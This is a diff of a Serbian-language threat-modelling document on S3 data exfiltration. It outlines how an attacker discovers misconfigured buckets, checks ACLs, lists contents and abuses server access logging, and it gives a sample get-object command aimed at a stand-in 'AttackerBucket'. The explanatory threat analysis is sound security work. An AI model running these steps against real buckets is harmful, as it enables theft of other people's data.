@@ -19,7 +19,7 @@ Napadač prvo identifikuje AWS S3 bucket koji će mu potencijalno biti cilj napa
 
 Nakon pronalska potencijalnih ciljnih bucket-a sledi analiza bezbednosnih mera kako bi se identifikovale ranjivosti kao i procena da li su podaci unutar njih vredni. Da bi se proverila konfiguracija amazon S3 bucket-a potrebno je instalirati AWSCLI. Bitno je napomenuti da AWSCLI mora biti konfigurisan dodavanjem podataka o AWS nalogu, odnosno klijentskom ID-u i tajnom ključu. Nakon toga moguće je proveriti da li postoje konfiguracije koje mogu dovesti do izvršavanja napada. Kako bi se videle dozvole koristi se sledeća komanda:
  ```
-     aws s3api get-bucket-acl --bucket <bucket-name>
+     aws s3api get-bucket-acl --bucket <bucket-name> --output json
  ```
 Kako bi napadač video sadržaj u S3 bucket-u koristi sledeću komandu koja će izlistati sve datoteke i direktorijume u datom bucket-u:
  ```
@@ -31,7 +31,7 @@ Ako bucket ima netačno konfigurisane dozvole, napadač može lako preuzeti poda
  ```
 Nakon ovih koraka napad je izvršen i napadač može da iskoristi podatke u skladu sa svojim ciljevima. Na ovaj način Data Exfiltration ostvaruje pretnju 'Neovlašćeni pristup osetljivim podacima' [P1]. Napadač može da proda osetljive informacije na crnom tržištu, da vrši iznudu ili ucenu onoga kome je podatke ukrao.
 
-Sledeći konkretan scenario napada bi se mogao prikazati ako napadač ima kontrolu nad S3 bucket-om koji se koristi za čuvanje server access logova [[3]](#reference). Napadač aktivira server access logove na ciljnom S3 bucket-u nad kojim želi izvršiti napad data exfilitration. Sa server access loggging-om svaki zahtev ka bucket-u će biti zabeležen u bucket-u za logovanje. Ovo uključuje interne AWS zahteve ili zahteve izvršene putem AWS konzole. Čak i ako je zahtev odbijen, payload koji zahtev nosi će biti poslat ka napadačevom logging bucket-u. Napadač može slati GetObject zahteve ka S3 bucket-ovima do kojih nema pristup:
+Sledeći konkretan scenario napada bi se mogao prikazati ako napadač ima kontrolu nad S3 bucket-om koji se koristi za čuvanje server access logova [[3]](#reference). Napadač aktivira server access logove na ciljnom S3 bucket-u nad kojim želi izvršiti napad data exfilitration. Sa server access logging-om svaki zahtev ka bucket-u će biti zabeležen u bucket-u za logovanje. Ovo uključuje interne AWS zahteve ili zahteve izvršene putem AWS konzole. Čak i ako je zahtev odbijen, payload koji zahtev nosi će biti poslat ka napadačevom logging bucket-u. Napadač može slati GetObject zahteve ka S3 bucket-ovima do kojih nema pristup:
  ```
     aws s3api get-object --bucket AttackerBucket --key ExampleDataToExfiltrate
  ```
